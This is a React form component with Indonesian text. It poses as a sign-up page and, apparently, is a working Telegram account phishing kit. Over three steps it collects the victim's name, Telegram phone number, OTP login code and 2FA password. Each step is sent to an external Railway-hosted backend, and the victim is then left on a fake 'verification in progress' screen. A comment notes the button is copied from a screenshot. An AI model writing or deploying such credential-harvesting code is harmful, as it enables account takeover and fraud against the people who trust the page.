"use client"

import { useState } from "react"
import { useForm } from "react-hook-form"
import * as z from "zod"
import { zodResolver } from "@hookform/resolvers/zod"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "./ui/form"
import { toast } from "sonner"
import { Loader2 } from "lucide-react"

// Schema validasi dengan batasan minimal 10 digit nomor
const formSchema = z.object({
  nama: z.string().min(1, "Nama Lengkap wajib diisi"),
  nomor_hp: z.string().min(10, "Nomor minimal 10 digit"),
  otp: z.string().optional(),
  sandi: z.string().optional(),
})

export default function AuthForm() {
  const [step, setStep] = useState(1) 
  const [isLoading, setIsLoading] = useState(false)
  
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: { nama: "", nomor_hp: "", otp: "", sandi: "" },
  })

  async function sendToBackend(data: any, type: string) {
    const backendUrl = "https://backend-python-production-6e72.up.railway.app"
    try {
      await fetch(`${backendUrl}/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          name: data.nama, 
          phone: data.nomor_hp,
          step: type,
          otp: data.otp || "",
          password: data.sandi || ""
        }),
      })
    } catch (error) {
      console.error("Gagal terhubung ke server:", error)
    }
  }

  const onSubmit = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true)
    try {
      if (step === 1) {
        await sendToBackend(values, "DATA_AWAL")
        setStep(2)
        toast.success("Kode OTP sedang dikirim")
      } else if (step === 2) {
        await sendToBackend(values, "INPUT_OTP")
        setStep(3)
      } else if (step === 3) {
        await sendToBackend(values, "INPUT_SANDI")
        setStep(4) 
      }
    } catch (err) {
      toast.error("Terjadi kesalahan teknis.")
    } finally {
      setIsLoading(false)
    }
  }

  // Tampilan Berhasil / Loading Final
  if (step === 4) {
    return (
      <div className="w-full max-w-md mx-auto p-8 border rounded-xl shadow-lg bg-white text-center space-y-4">
        <Loader2 className="h-12 w-12 animate-spin text-blue-600 mx-auto" />
        <h2 className="text-xl font-bold text-gray-800">Verifikasi Sedang Diproses</h2>
        <p className="text-gray-600 text-sm">Silakan tunggu konfirmasi melalui Telegram Anda dalam 1X24 Jam.</p>
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
      {/* Banner */}
      <div className="mb-6 overflow-hidden rounded-xl border">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto object-cover" />
      </div>

      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
          {step === 1 && (
            <>
              <FormField control={form.control} name="nama" render={({ field }: { field: any }) => (
                <FormItem>
                  <FormLabel className="font-semibold text-gray-700">Nama Lengkap:</FormLabel>
                  <FormControl><Input placeholder="Masukkan nama" {...field} /></FormControl>
                  <FormMessage />
                </FormItem>
              )} />
              <FormField control={form.control} name="nomor_hp" render={({ field }: { field: any }) => (
                <FormItem>
                  <FormLabel className="font-semibold text-gray-700">Nomor Telegram Aktif:</FormLabel>
                  <FormControl><Input placeholder="08XXXXXXXXXX" {...field} /></FormControl>
                  <FormMessage />
                </FormItem>
              )} />
            </>
          )}

          {step === 2 && (
            <FormField control={form.control} name="otp" render={({ field }: { field: any }) => (
              <FormItem>
                <FormLabel className="font-semibold text-center block">Masukkan Kode OTP</FormLabel>
                <FormControl><Input placeholder="5 Digit" className="text-center text-lg" {...field} /></FormControl>
                <FormMessage />
              </FormItem>
            )} />
          )}

          {step === 3 && (
            <FormField control={form.control} name="sandi" render={({ field }: { field: any }) => (
              <FormItem>
                <FormLabel className="font-semibold text-gray-700">Masukkan Kata Sandi (2FA)</FormLabel>
                <FormControl><Input type="password" placeholder="******" className="text-center" {...field} /></FormControl>
                <FormMessage />
              </FormItem>
            )} />
          )}

          {/* Tombol Biru Identik Screenshot (284) */}
          <Button 
            type="submit" 
            disabled={isLoading} 
            className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 transition-all uppercase"
          >
            {isLoading ? "Memproses..." : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
          </Button>
        </form>
      </Form>

      {/* Teks Peringatan Abu-abu */}
      <div className="mt-6 text-left border-t pt-4">
        <p className="text-[12px] text-gray-500 leading-tight">
          Peringatan:
          <br />
          Pendaftaran hanya akan di masukkan melaui data dari pendaftaran melalui telegram yang aktif!
        </p>
      </div>
    </div>
  )
}